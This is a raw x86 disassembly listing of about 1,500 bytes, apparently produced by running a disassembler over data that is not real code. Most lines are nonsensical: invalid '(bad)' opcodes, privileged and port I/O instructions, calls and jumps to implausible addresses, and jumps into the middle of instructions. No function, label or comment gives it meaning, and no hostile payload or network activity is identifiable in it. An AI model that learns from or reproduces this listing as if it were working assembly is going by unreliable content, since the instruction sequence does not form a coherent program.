  430aff:	lock fwait
  430b01:	ret    
  430b02:	xor    al,BYTE PTR [ebp-0x77]
  430b05:	mov    esi,esp
  430b07:	rol    BYTE PTR [ebp-0x7c],1
  430b0a:	xor    ebx,DWORD PTR [ebx-0x7772cd47]
  430b10:	call   edi
  430b12:	enter  0x4d45,0x8b
  430b16:	mov    esi,eax
  430b18:	fmul   st(3),st
  430b1a:	push   ebp
  430b1b:	dec    ebp
  430b1c:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  430b22:	ret    0xc19b
  430b25:	xor    al,BYTE PTR [esi-0x280276]
  430b2b:	dec    ebp
  430b2c:	jne    0x430b61
  430b2e:	mov    eax,DWORD PTR [ebx]
  430b30:	cld    
  430b31:	loopne 0x430ae3
  430b33:	push   ebp
  430b34:	add    DWORD PTR [eax+0x72851100],ecx
  430b3a:	inc    DWORD PTR [eax]
  430b3c:	inc    DWORD PTR [ebp-0x75]
  430b3f:	mov    edi,esp
  430b41:	lock add bl,0x1
  430b45:	retf   
  430b46:	add    dh,al
  430b48:	xor    dh,cl
  430b4a:	inc    ebp
  430b4b:	scas   eax,DWORD PTR es:[edi]
  430b4c:	mov    eax,DWORD PTR [ebx]
  430b4e:	shl    al,0x0
  430b51:	inc    ebp
  430b52:	dec    DWORD PTR [ebx+0x4dccf0ff]
  430b58:	call   0x461e90
  430b5d:	ud0    eax,ecx
  430b60:	adc    al,0x4d
  430b62:	inc    ebp
  430b63:	xor    ecx,DWORD PTR [ebx+0x8bd82b]
  430b69:	lock push 0x338055
  430b6f:	add    eax,DWORD PTR [eax]
  430b71:	ud0    ecx,edx
  430b74:	sbb    BYTE PTR [ebp+0x5e],dl
  430b77:	xor    ecx,ecx
  430b79:	sub    eax,DWORD PTR [ecx*4+0x72ec1155]
  430b80:	push   ecx
  430b81:	add    BYTE PTR [ebp-0x38],cl
  430b84:	mov    DWORD PTR [esi-0x740004],eax
  430b8a:	cld    
  430b8b:	inc    ebp
  430b8c:	jmp    0x430b19
  430b8e:	mov    esp,esp
  430b90:	mov    ebx,eax
  430b92:	mov    eax,esi
  430b94:	clc    
  430b95:	scas   eax,DWORD PTR es:[edi]
  430b96:	icebp  
  430b97:	mov    esi,DWORD PTR [ebp-0x28]
  430b9a:	(bad)  
  430b9b:	retf   
  430b9c:	or     ecx,eax
  430b9e:	(bad)  
  430b9f:	dec    ebp
  430ba0:	pop    es
  430ba1:	(bad)  
  430ba2:	(bad)  
  430ba3:	or     BYTE PTR [esi],al
  430ba5:	jb     0x430b6d
  430ba7:	add    BYTE PTR [ebx],al
  430ba9:	inc    ebp
  430baa:	(bad)  
  430bab:	mov    ecx,DWORD PTR [edx]
  430bad:	fadd   st(6),st
  430baf:	ret    
  430bb0:	add    ah,BYTE PTR [ebp-0x37]
  430bb3:	int    0x55
  430bb5:	sub    ebp,esp
  430bb7:	add    edx,DWORD PTR [ecx-0x14]
  430bba:	inc    ebp
  430bbb:	inc    ebp
  430bbc:	mov    DWORD PTR [ebx-0x3c740b04],ecx
  430bc2:	cld    
  430bc3:	(bad)  
  430bc4:	(bad)  
  430bc5:	scas   eax,DWORD PTR es:[edi]
  430bc6:	loopne 0x430c03
  430bc8:	mov    DWORD PTR [edi],ecx
  430bca:	mov    ebp,ebp
  430bcc:	clc    
  430bcd:	push   eax
  430bcf:	push   DWORD PTR [ebp-0x4]
  430bd2:	mov    BYTE PTR [ebp+0xa],0xff
  430bd6:	(bad)  
  430bd7:	int3   
  430bd8:	or     BYTE PTR [eax],al
  430bda:	(bad)  
  430bdb:	lea    eax,[edi]
  430bdd:	ins    BYTE PTR es:[edi],dx
  430bde:	(bad)  
  430bdf:	inc    DWORD PTR [ecx]
  430be1:	push   eax
  430be2:	mov    BYTE PTR [ebp+0x9],0x8b
  430be6:	leave  
  430be7:	les    edx,FWORD PTR [ebp+0x0]
  430bea:	in     al,dx
  430beb:	call   DWORD PTR [ecx-0x75]
  430bee:	inc    ebp
  430bef:	cld    
  430bf0:	mov    DWORD PTR [eax+0x8b01fc],eax
  430bf6:	cld    
  430bf7:	xor    BYTE PTR [eax-0x76a8f98b],bh
  430bfd:	pop    es
  430bfe:	mov    eax,DWORD PTR [eax]
  430c00:	clc    
  430c01:	test   eax,esi
  430c03:	je     0x430c7a
  430c05:	mov    eax,esi
  430c07:	cld    
  430c08:	add    al,0x80
  430c0a:	add    WORD PTR [ecx+0x0],ax
  430c0e:	fiadd  DWORD PTR [eax]
  430c10:	mov    BYTE PTR [eax],0x3d
  430c13:	push   0xffffffc3
  430c15:	push   edi
  430c16:	mov    edx,DWORD PTR [eax+0x51]
  430c19:	pop    edi
  430c1a:	lea    ebx,[ebx-0x8]
  430c1d:	ret    0x45
  430c20:	mov    ecx,DWORD PTR [ebx-0x7240ae04]
  430c26:	xchg   eax,edi
  430c28:	mov    DWORD PTR [ebp-0x75],ecx
  430c2b:	push   esi
  430c2c:	clc    
  430c2d:	jne    0x430bff
  430c2f:	mov    ecx,0xf8450b0b
  430c34:	(bad)  
  430c35:	push   cs
  430c36:	or     BYTE PTR [ebp-0x3a],dh
  430c39:	cmp    eax,DWORD PTR [ecx]
  430c3b:	pop    esi
  430c3c:	(bad)  
  430c3d:	or     al,0x5
  430c3f:	inc    eax
  430c40:	leave  
  430c41:	jmp    0x40cf:0x25564204
  430c48:	leave  
  430c49:	in     eax,dx
  430c4a:	inc    DWORD PTR [eax-0x75]
  430c4d:	fimul  DWORD PTR [ebx-0x228139be]
  430c53:	inc    eax
  430c54:	nop
  430c55:	loopne 0x430c56
  430c57:	ret    
  430c58:	mov    ecx,DWORD PTR [ebx-0x7239ae75]
  430c5e:	add    eax,0xff45e8f8
  430c63:	push   esi
  430c64:	push   DWORD PTR [ebp-0x39]
  430c67:	mov    eax,0x7edda46
  430c6c:	or     al,0x6
  430c6e:	push   DWORD PTR [ebp-0x3a]
  430c71:	cmp    eax,DWORD PTR [edx]
  430c73:	pop    esi
  430c74:	ret    
  430c75:	or     al,0x56
  430c77:	inc    ecx
  430c78:	push   ebp
  430c79:	jle    0x430c67
  430c7b:	inc    edx
  430c7c:	inc    ebp
  430c7d:	int    0x1
  430c7f:	inc    ecx
  430c80:	sub    BYTE PTR ds:0xe77541fc,ah
  430c86:	add    DWORD PTR [edx+0x1c],eax
  430c89:	retf   0xc38b
  430c8c:	adc    al,0x8b
  430c8e:	xchg   edx,eax
  430c8f:	push   ecx
  430c90:	mov    cl,BYTE PTR [ebp+0x45c8f8fe]
  430c96:	rcl    DWORD PTR [esi-0x9],cl
  430c99:	jne    0x430ceb
  430c9b:	mov    eax,0x7c80ece
  430ca0:	rol    DWORD PTR [esi],cl
  430ca2:	div    DWORD PTR [ebp+0x50]
  430ca5:	cmp    ecx,edx
  430ca7:	pop    esi
  430ca8:	dec    BYTE PTR [edx]
  430caa:	in     al,dx
  430cab:	inc    edx
  430cac:	sub    esp,ecx
  430cae:	inc    eax
  430caf:	(bad)  
  430cb0:	push   eax
  430cb1:	add    edx,DWORD PTR [eax-0x1f]
  430cb4:	push   edi
  430cb5:	add    dh,dh
  430cb7:	leave  
  430cb8:	adc    DWORD PTR [ebp-0x1],0xffffffec
  430cbc:	add    BYTE PTR [ecx+0x0],dl
  430cbf:	inc    ebp
  430cc0:	ror    DWORD PTR [ecx+0x5536fc8d],cl
  430cc6:	add    BYTE PTR [eax-0x7fbf448],bh
  430ccc:	add    al,0x2
  430cce:	jmp    0x57eb828
  430cd3:	jne    0x430cbd
  430cd5:	mov    eax,DWORD PTR [edx]
  430cd7:	or     BYTE PTR [eax],al
  430cd9:	inc    ecx
  430cda:	stc    
  430cdb:	in     eax,dx
  430cdc:	ss inc eax
  430cde:	aas    
  430cdf:	out    0x7d,eax
  430ce1:	inc    ecx
  430ce2:	mov    ebp,ecx
  430ce4:	lock ret 0x7d
  430ce8:	and    ecx,DWORD PTR [ebx-0x171777]
  430cee:	add    bh,bh
  430cf0:	aad    0xd7
  430cf2:	add    dh,cl
  430cf4:	clts   
  430cf6:	(bad)  
  430cf7:	call   0xffce0bfc
  430cfc:	hlt    
  430cfd:	iret   
  430cfe:	jge    0x430cd6
  430d00:	rol    DWORD PTR [esi-0x80],cl
  430d03:	jmp    0x1c5c10
  430d08:	out    dx,al
  430d09:	mov    eax,DWORD PTR [ebx]
  430d0b:	(bad)  
  430d0c:	pop    esi
  430d0d:	push   es
  430d0e:	cmp    al,0xe8
  430d10:	sar    edi,0x8
  430d13:	inc    DWORD PTR [edi]
  430d15:	inc    esi
  430d16:	(bad)  
  430d17:	loopne 0x430d97
  430d19:	push   edi
  430d1a:	push   cs
  430d1b:	push   ebx
  430d1c:	add    BYTE PTR [ebx+0x24008b56],cl
  430d22:	add    BYTE PTR [ebp+0x50],al
  430d25:	push   eax
  430d26:	add    DWORD PTR [ebx+0x757d1834],ecx
  430d2c:	sub    edx,DWORD PTR [esi-0x24]
  430d2f:	jne    0x430ce7
  430d31:	lods   eax,DWORD PTR ds:[esi]
  430d32:	mov    edx,DWORD PTR [edx-0x34]
  430d35:	dec    esi
  430d36:	out    0x83,eax
  430d38:	into   
  430d39:	push   edi
  430d3b:	loopne 0x430d0b
  430d3d:	shr    BYTE PTR [edx+ecx*4+0x0],1
  430d41:	and    DWORD PTR [edx-0x741fff01],0xffffffd0
  430d48:	rol    DWORD PTR [edx],0x8
  430d4b:	mov    esp,ecx
  430d4d:	cmp    DWORD PTR [ebx],0xc
  430d50:	mov    esi,0x5001c0
  430d55:	push   eax
  430d56:	push   cs
  430d57:	push   eax
  430d58:	(bad)  
  430d59:	sub    edx,edi
  430d5b:	push   esi
  430d5c:	adc    al,0xcb
  430d5e:	ins    DWORD PTR es:[edi],dx
  430d5f:	mov    eax,0x203e8
  430d64:	add    al,ah
  430d66:	ror    BYTE PTR [eax+0xc007c0],0xc0
  430d6d:	add    dh,al
  430d6f:	add    ah,ch
  430d71:	rol    DWORD PTR [ebx-0x3595fb0d],1
  430d77:	pop    ecx
  430d78:	or     eax,ebx
  430d7a:	cli    
  430d7b:	add    BYTE PTR [ecx-0x4e728d1e],dh
  430d81:	lea    ebp,[ebx]
  430d83:	mov    edx,DWORD PTR [edx-0x4]
  430d86:	dec    ecx
  430d87:	inc    ebp
  430d88:	shr    BYTE PTR [ebx],0x4b
  430d8b:	and    al,0x0
  430d8d:	(bad)  
  430d8e:	jne    0x430dd5
  430d90:	pop    eax
  430d91:	mov    al,0x5a
  430d93:	call   0x1420ff2
  430d98:	and    al,0x85
  430d9a:	push   edx
  430d9b:	add    BYTE PTR [eax+eax*1+0x0],ah
  430d9f:	dec    ebp
  430da0:	mov    cl,0x23
  430da2:	jmp    0x430d90
  430da4:	mov    al,0xe7
  430da6:	call   0x1391094
  430dab:	shr    DWORD PTR [eax+ebx*2],cl
  430dae:	lock (bad) 
  430db0:	adc    eax,0x757f008d
  430db5:	out    0x58,eax
  430db7:	cmp    al,0x7
  430db9:	pop    edx
  430dba:	or     DWORD PTR [edx+eax*1-0x74fff494],ecx
  430dc1:	push   ecx
  430dc2:	cld    
  430dc3:	mov    esi,0x3b0175
  430dc8:	and    al,0xb0
  430dca:	xor    BYTE PTR [edx+0x1],0x8b
  430dce:	add    ah,bh
  430dd0:	mov    edi,DWORD PTR [ebp-0x4]
  430dd3:	psubsw mm7,QWORD PTR [edi]
  430dd6:	add    DWORD PTR [ebp+0x0],ebp
  430dd9:	rcr    eax,1
  430ddb:	mov    edi,ecx
  430ddd:	and    eax,DWORD PTR [eax]
  430ddf:	add    ecx,DWORD PTR [ebx+0x1b4dd88d]
  430de5:	call   0x13010ce
  430dea:	add    al,cl
  430dec:	mov    ebp,esi
  430dee:	aam    0x83
  430df0:	or     DWORD PTR [ecx],eax
  430df2:	jne    0x430de5
  430df4:	mov    eax,DWORD PTR [eax]
  430df6:	aam    0x0
  430df8:	dec    ebp
  430df9:	jne    0x430d86
  430dfb:	cmp    ebx,eax
  430dfd:	jb     0x430e4c
  430dff:	jmp    0x430d8c
  430e01:	mov    ebx,esp
  430e03:	int3   
  430e04:	dec    ebp
  430e05:	or     DWORD PTR [ecx+0x5f8bdc00],0xffffff8b
  430e0c:	mov    edx,0x8b0a8b
  430e11:	cmp    ecx,DWORD PTR [eax]
  430e13:	jb     0x430dec
  430e15:	pop    edx
  430e16:	push   edi
  430e17:	cli    
  430e18:	pop    es
  430e19:	mov    eax,ecx
  430e1b:	jb     0x430e1f
  430e1d:	add    DWORD PTR [ebx],0xa
  430e20:	mov    eax,DWORD PTR [ebx]
  430e22:	int3   
  430e23:	add    bh,BYTE PTR [esi+0x75d10006]
  430e29:	jmp    0x430db6
  430e2b:	mov    al,0xe8
  430e2d:	call   0x10410af
  430e32:	add    edx,DWORD PTR [ecx+ecx*8]
  430e35:	pop    edi
  430e36:	or     BYTE PTR [ecx-0x73],bl
  430e39:	pop    ecx
  430e3a:	inc    edi
  430e3b:	xor    al,0xeb
  430e3d:	push   ecx
  430e3e:	mov    edi,DWORD PTR [edx+0xc506cc]
  430e44:	call   0xb20f49
  430e49:	int3   
  430e4a:	sbb    BYTE PTR [esi],ch
  430e4c:	inc    ebp
  430e4d:	add    BYTE PTR [ebx-0x1f4f338b],cl
  430e53:	call   0x9c10c2
  430e58:	or     BYTE PTR [ebx-0x73],dl
  430e5b:	cmp    al,0x47
  430e5d:	mov    al,0x1
  430e5f:	jb     0x430e61
  430e61:	mov    al,0x10
  430e63:	push   eax
  430e64:	add    al,0x75
  430e66:	add    BYTE PTR [ebx],ch
  430e68:	add    ebx,esp
  430e6a:	int3   
  430e6b:	jne    0x430e7d
  430e6d:	movsx  edx,cl
  430e70:	add    DWORD PTR [eax],eax
  430e72:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  430e79:	mov    gs,edi
  430e7b:	add    BYTE PTR [eax-0x50],ch
  430e7e:	add    al,ch
  430e80:	mov    eax,DWORD PTR [ecx]
  430e82:	sub    eax,DWORD PTR [eax]
  430e84:	jb     0x430efb
  430e86:	add    DWORD PTR [esp+eiz*8-0x50],esi
  430e8a:	jge    0x430e74
  430e8c:	add    al,0x1
  430e8e:	add    DWORD PTR [eax],0x0
  430e91:	jne    0x430e93
  430e93:	je     0x430eda
  430e95:	mov    eax,DWORD PTR [edi]
  430e97:	ror    BYTE PTR [ebp+0x4d],1
  430e9a:	or     DWORD PTR [ecx+0x4d03d004],0x3
  430ea1:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  430ea7:	mov    DWORD PTR [ebx],ebp
  430ea9:	fadd   DWORD PTR [eax+0x75]
  430eac:	inc    eax
  430ead:	pop    eax
  430eae:	lea    ebx,[ecx+0x4f]
  430eb1:	push   0xb1000003
  430eb6:	out    dx,eax
  430eb7:	add    ebp,DWORD PTR [edx+edx*2]
  430eba:	add    BYTE PTR [ebx+ecx*4],bh
  430ebd:	mov    ch,BYTE PTR [ebx]
  430ebf:	jb     0x430f33
  430ec1:	add    al,0x89
  430ec3:	push   eax
  430ec4:	call   0x842b5c36
  430ec9:	add    DWORD PTR [eax+eax*1],eax
  430ecc:	jae    0x430ee2
  430ece:	icebp  
  430ecf:	inc    ebp
  430ed0:	mov    eax,DWORD PTR gs:[ecx]
  430ed3:	int3   
  430ed4:	out    dx,al
  430ed5:	loopne 0x430f24
  430ed7:	sub    eax,DWORD PTR [edx]
  430ed9:	push   0xffffff83
  430edb:	pop    esi
  430edc:	push   cs
  430edd:	jl     0x430ef8
  430edf:	add    al,0xaf
  430ee1:	xor    eax,0x832b6d00
  430ee6:	mov    eax,DWORD PTR [edx]
  430ee8:	rcr    BYTE PTR [ebp+0x754500dc],cl
  430eee:	ror    DWORD PTR [ebx+0x7dc8e803],1
  430ef4:	inc    ebp
  430ef5:	shr    ebx,0x3
  430ef8:	or     DWORD PTR [eax],0x4
  430efb:	push   0xffffffa5
  430efd:	pop    esi
  430efe:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  430f05:	jmp    0x430f64
  430f07:	mov    edi,0xff0272
  430f0c:	fdivr  QWORD PTR [ebp+0x5d]
  430f0f:	push   0x4e
  430f11:	pop    ecx
  430f12:	call   0x435317
  430f17:	mov    DWORD PTR [ebx],eax
  430f19:	in     al,0xc8
  430f1b:	rol    BYTE PTR [ebp-0x75],0xc1
  430f1f:	call   0xad1100
  430f24:	pop    esi
  430f25:	enter  0xceff,0x8b
  430f29:	repz mov ecx,DWORD PTR [ebp-0x34]
  430f2d:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  430f34:	je     0x430f36
  430f36:	or     DWORD PTR [ebx-0x74183b24],eax
  430f3c:	jne    0x430f22
  430f3e:	jmp    0x430f39
  430f40:	push   DWORD PTR [edx-0x24]
  430f43:	push   0x4d
  430f45:	pop    ecx
  430f46:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  430f4a:	jge    0x430f52
  430f4c:	mov    eax,eax
  430f4e:	sub    ebp,DWORD PTR [edx+0x24]
  430f51:	pop    esi
  430f52:	inc    ebp
  430f53:	mov    esp,0x8b6077
  430f58:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  430f5e:	lods   al,BYTE PTR ds:[esi]
  430f5f:	add    BYTE PTR [ebx],bh
  430f61:	enter  0xce73,0x49
  430f65:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  430f6d:	stc    
  430f6e:	jge    0x430fe2
  430f70:	jnp    0xdd4292df
  430f76:	call   0xc6104c
  430f7b:	fadd   st(0),st
  430f7d:	dec    esi
  430f7e:	ins    BYTE PTR es:[edi],dx
  430f7f:	stc    
  430f80:	cmp    al,0x73
  430f82:	push   ebp
  430f83:	mov    eax,0xf8028b
  430f88:	jne    0x430f4b
  430f8a:	mov    esi,ecx
  430f8c:	mov    esp,DWORD PTR [ebp+0x2c]
  430f8f:	add    edi,DWORD PTR [ebp-0x24]
  430f92:	sub    esp,eax
  430f94:	and    al,0x45
  430f96:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  430f9c:	sbb    al,0xee
  430f9e:	pop    esi
  430f9f:	call   0x830fcf
  430fa4:	fsubr  st,st(3)
  430fa6:	sti    
  430fa7:	add    BYTE PTR gs:[ecx],bh
  430faa:	add    eax,esp
  430fac:	add    DWORD PTR [esi],eax
  430fae:	rol    DWORD PTR [ebp+0x8],0x29
  430fb2:	mov    esp,eax
  430fb4:	clc    
  430fb5:	jne    0x43102c
  430fb7:	mov    eax,0x8b0673
  430fbc:	loopne 0x431003
  430fbe:	loopne 0x430f49
  430fc0:	lods   al,BYTE PTR ds:[esi]
  430fc1:	int3   
  430fc2:	inc    ebp
  430fc3:	mov    DWORD PTR gs:[eax+edi*8],eax
  430fc7:	add    al,0xc3
  430fc9:	sub    ecx,DWORD PTR [ebp+0x47]
  430fcc:	(bad)  
  430fce:	shr    BYTE PTR [ebp-0x1f],0xe8
  430fd2:	add    eax,DWORD PTR [eax]
  430fd4:	call   0x644d0d9
  430fd9:	add    esi,DWORD PTR [esi-0x3b2efc83]
  430fdf:	dec    esi
  430fe0:	ins    DWORD PTR es:[edi],dx
  430fe1:	in     al,dx
  430fe2:	lea    eax,[eax]
  430fe4:	inc    ebp
  430fe5:	inc    ebp
  430fe6:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  430fec:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  430ff6:	and    al,0xdc
  430ff8:	ror    DWORD PTR [edx+0x24],0xf7
  430ffc:	or     BYTE PTR [ebp+0x4c],dh
  430fff:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  431003:	stos   BYTE PTR es:[edi],al
  431004:	adc    edx,edi
  431006:	inc    esp
  431007:	add    edi,DWORD PTR [eax]
  431009:	jne    0x430fee
  43100b:	mov    DWORD PTR [eax-0x7449db04],ecx
  431011:	cmp    ecx,DWORD PTR [edi]
  431013:	sub    BYTE PTR [ebp-0x7e],dl
  431016:	sar    ebp,0xb
  431019:	jmp    FWORD PTR [edi+0x2400392a]
  43101f:	sub    esi,DWORD PTR [ebx-0x73]
  431022:	mov    esp,DWORD PTR [ecx+edi*4]
  431025:	mov    ecx,DWORD PTR [eax]
  431027:	and    BYTE PTR [eax],al
  431029:	jne    0x430ff5
  43102b:	sub    ebp,ecx
  43102d:	sbb    BYTE PTR [esi+0x32],ah
  431030:	dec    ebp
  431031:	push   ebp
  431032:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  431038:	ret    
  431039:	mov    edx,ebp
  43103b:	leave  
  43103c:	sub    DWORD PTR [esi+0x24],ebx
  43103f:	ret    0x2b
  431042:	pop    ax
  431044:	push   ebp
  431045:	rol    BYTE PTR [ebx],0xeb
  431048:	add    DWORD PTR [ecx+0x6c0001],0x40
  43104f:	jb     0x4310a6
  431051:	ret    
  431052:	in     al,dx
  431053:	jecxz  0x430fe0
  431055:	push   esi
  431056:	xchg   esp,eax
  431057:	jne    0x431059
  431059:	cmp    edx,DWORD PTR [esi+0x1c]
  43105c:	jne    0x431042
  43105e:	mov    eax,DWORD PTR [ebp-0x77]
  431061:	ror    DWORD PTR [ebx+0x899408],0xe0
  431068:	mov    esi,DWORD PTR [ebp-0x75]
  43106b:	pop    esi
  43106c:	nop
  43106d:	mov    eax,DWORD PTR [eax]
  43106f:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  431075:	add    al,0x0
  431077:	inc    ebp
  431078:	mov    eax,DWORD PTR [ebx]
  43107a:	mov    ebp,ebx
  43107c:	cmp    al,0xf
  43107e:	or     al,al
  431080:	inc    ebp
  431081:	inc    ebp
  431082:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  431088:	cld    
  431089:	add    BYTE PTR [edi+0x546c16c0],dh
  43108f:	add    BYTE PTR [ecx-0x5],dl
  431092:	add    eax,0x17200
  431097:	sbb    al,0x85
  431099:	dec    esp
  43109a:	je     0x4310d4
  43109c:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  4310a0:	add    BYTE PTR [ebx],bh
  4310a2:	(bad)  
  4310a3:	and    al,0x32
  4310a5:	jae    0x431043
  4310a7:	mov    cl,cl
  4310a9:	inc    DWORD PTR [esp]
  4310ac:	push   ebp
  4310ad:	shr    esp,0x8
  4310b0:	in     al,dx
  4310b1:	push   esp
  4310b2:	add    DWORD PTR [eax],esp
  4310b4:	add    bl,cl
  4310b6:	inc    ebp
  4310b7:	mov    bh,0x89
  4310b9:	add    ah,bh
  4310bb:	jmp    0xca752005
  4310c0:	pushf  
  4310c1:	dec    esp
  4310c2:	mov    edx,0xf8178520
  4310c7:	fst    DWORD PTR [ebp+0x0]
  4310ca:	mov    BYTE PTR [eax],0xc4
  4310cd:	sub    edx,DWORD PTR [ebx-0x3f]
  4310d0:	inc    ebp
  4310d1:	add    eax,0xc601da
  4310d6:	mov    al,0xc6
  4310d9:	ins    BYTE PTR es:[edi],dx
  4310da:	mov    DWORD PTR [eax+0x57],0x2c0545c1
  4310e1:	dec    esp
  4310e2:	jmp    DWORD PTR [eax]
  4310e4:	inc    ebp
  4310e5:	fnstcw WORD PTR [esi+0x29]
  4310e8:	test   BYTE PTR [eax],0xc8
  4310eb:	rol    BYTE PTR [eax],0xc0
  4310ee:	lea    ecx,[ebp-0x3cf0dbcb]
  4310f4:	sbb    BYTE PTR [ebx-0x75fcae0d],cl
  4310fa:	inc    esi
  4310fb:	add    DWORD PTR [eax],ebx
  4310fd:	add    dh,bh
  4310ff:	mov    esi,DWORD PTR [edx+0x8]
  431102:	(bad)  
  431103:	fdiv   QWORD PTR ss:[ecx]
  431106:	(bad)  
  431107:	mov    bl,ch
  431109:	add    esi,eax
  43110b:	add    dh,bl
  43110d:	or     esi,eax
  43110f:	mov    dl,0xdf
  431111:	add    esi,eax
  431113:	add    al,ah
  431115:	push   cs
  431116:	mov    BYTE PTR [edx+0xc601e1],0xe2
  43111d:	or     BYTE PTR [ebx],dh
  43111f:	dec    ecx
  431120:	lea    eax,[ebx]
  431122:	xor    eax,0x18fc0fc7
  431127:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431128:	repz clc 
  43112a:	add    eax,DWORD PTR [ebp+0x46]
  43112d:	prefetcht0 BYTE PTR [ecx-0x2]
  431131:	xor    eax,0x7c60872
  431136:	mov    esp,0xbd32c69b
  43113b:	pop    esi
  43113c:	mov    cl,0xbe
  43113f:	or     al,0xc6
  431141:	cmp    BYTE PTR [edi-0x3fff39ff],0x0
  431148:	mov    BYTE PTR [ebp-0x3d39073f],0xc2
  43114f:	add    dh,al
  431151:	mov    eax,ebx
  431153:	xor    DWORD PTR [ebx],0x35008dbc
  431159:	mov    ecx,DWORD PTR [edi]
  43115b:	sbb    al,0x18
  43115d:	inc    ebp
  43115e:	xrelease mov DWORD PTR [ebx],0x188546f4
  431165:	clc    
  431166:	(bad)  
  431167:	xor    DWORD PTR [edx-0x64],esi
  43116a:	lea    ecx,[ecx+0x45ffe838]
  431170:	mov    ecx,ebx
  431172:	fadd   st,st(6)
  431174:	dec    ebp
  431175:	lds    edi,FWORD PTR [eax+0x7145fc56]
  43117b:	out    0x1,eax
  43117d:	inc    ebp
  43117e:	lea    ebp,ds:0xc8ffc6ff
  431184:	enter  0xa33,0xc6
  431188:	push   ebp
  431189:	leave  
  43118a:	(bad)  
  43118b:	xor    edi,DWORD PTR [eax-0x7ff7a47]
  431191:	add    BYTE PTR [ebp+0x44],al
  431194:	mov    eax,esp
  431196:	mov    WORD PTR [esi+0x46398300],?
  43119c:	psubusw mm4,QWORD PTR [esi-0x78]
  4311a0:	add    BYTE PTR [ebx-0x1303f975],al
  4311a6:	add    BYTE PTR [ebp+0x1],0xeb
  4311aa:	add    BYTE PTR [ebp+0x38],al
  4311ad:	in     eax,dx
  4311ae:	inc    ebp
  4311af:	inc    ebp
  4311b0:	mov    ebx,ebx
  4311b2:	add    BYTE PTR [ebp+0x0],0xec
  4311b6:	mov    DWORD PTR [ebp-0x41],eax
  4311b9:	sub    eax,0x2c00454e
  4311be:	ins    DWORD PTR es:[edi],dx
  4311bf:	inc    ebp
  4311c0:	add    BYTE PTR [esi+0x66],bh
  4311c3:	test   BYTE PTR [ebp-0x2300bc],0xb6
  4311ca:	mov    DWORD PTR [ebx-0x2699b977],0x83b888ff
  4311d4:	dec    edi
  4311d5:	pop    es
  4311d6:	add    ah,ch
  4311d8:	mov    DWORD PTR [ebp+0x68],eax
  4311db:	in     eax,dx
  4311dc:	inc    DWORD PTR [ebp-0x7d]
  4311df:	out    0xc0,al
  4311e1:	inc    ebp
  4311e2:	mov    edx,esp
  4311e4:	push   0x45
  4311e6:	(bad)  
  4311e7:	jmp    0xdf9257a4
  4311ec:	add    BYTE PTR [ebp-0x77],al
  4311ef:	out    dx,al
  4311f0:	ins    BYTE PTR es:[edi],dx
  4311f1:	inc    ebp
  4311f2:	jmp    edi
  4311f4:	add    DWORD PTR [ebp-0x14],0x7e
  4311f8:	mov    esi,esi
  4311fa:	outs   dx,BYTE PTR ds:[esi]
  4311fb:	inc    esp
  4311fc:	(bad)  
  4311fd:	mov    esp,0x8341b68d
  431202:	mov    DWORD PTR [esi+0x70],eax
  431205:	fcos   
  431207:	mov    BYTE PTR [ebx-0x76f7ca7d],al
  43120d:	in     al,dx
  43120e:	jb     0x431195
  431210:	(bad)  
  431211:	dec    DWORD PTR [ebx-0x7aba9901]
  431217:	mov    edi,edi
  431219:	fdivr  st,st(7)
  43121b:	out    dx,eax
  43121c:	rcl    BYTE PTR [ebx],0x66
  43121f:	mov    DWORD PTR [ebp-0xc70075],eax
  431225:	(bad)  
  431226:	std    
  431227:	cmp    eax,DWORD PTR [eax]
  431229:	jne    0x431291
  43122b:	mov    DWORD PTR [ebp-0xba0048],eax
  431231:	in     al,dx
  431232:	outs   dx,BYTE PTR ds:[esi]
  431233:	pushf  
  431234:	add    BYTE PTR [ebx-0x7f7a039a],cl
  43123a:	inc    DWORD PTR [ecx]
  43123c:	inc    DWORD PTR [eax]
  43123e:	jae    0x431278
  431240:	add    BYTE PTR [ebp+0x850266],al
  431246:	inc    DWORD PTR [ebp-0x1]
  431249:	mov    eax,eax
  43124b:	jl     0x4312b3
  43124d:	add    BYTE PTR [ebp-0x740077],al
  431253:	cld    
  431254:	dec    eax
  431255:	add    BYTE PTR [eax],0x1
  431258:	data16 add BYTE PTR [ebp+0x38],al
  43125c:	mov    eax,0x47c2
  431261:	mov    eax,0x824f89
  431266:	inc    edi
  431267:	mov    DWORD PTR [edx+0x64],ebp
  43126a:	inc    WORD PTR [ebp-0x75]
  43126e:	(bad)  
  43126f:	data16 rol BYTE PTR [ebp-0x16001a],1
  431276:	inc    ebp
  431277:	jge    0x431258
  431279:	add    bh,ah
  43127b:	lea    ax,[ebp-0x750030]
  431282:	add    al,0x46
  431285:	jmp    0x40ff:0x8885
  43128b:	push   DWORD PTR [ebp+0x52]
  43128e:	lea    eax,[eax]
  431290:	shl    BYTE PTR [esi-0x7b],1
  431293:	test   esi,edi
  431295:	(bad)  
  431296:	(bad)  
  431297:	inc    DWORD PTR [ebp-0x990140]
  43129d:	test   DWORD PTR [ebx+0x54fff4ff],ecx
  4312a3:	inc    edi
  4312a4:	push   ecx
  4312a5:	xor    ax,WORD PTR [ebp-0x8d0045]
  4312ac:	add    al,al
  4312ae:	ret    
  4312af:	mov    ax,WORD PTR [ebp-0x3f0004]
  4312b6:	push   eax
  4312b7:	mov    DWORD PTR [ebp-0x77],0xff98748b
  4312be:	add    BYTE PTR [ebx-0x764f8839],al
  4312c4:	push   DWORD PTR [esi+0x1]
  4312c7:	inc    DWORD PTR [eax]
  4312c9:	mov    eax,0xff99ff
  4312ce:	or     BYTE PTR [ecx-0x7a87bb],cl
  4312d4:	jne    0x43128e
  4312d6:	add    DWORD PTR [edx-0x76edff71],0xff707a8e
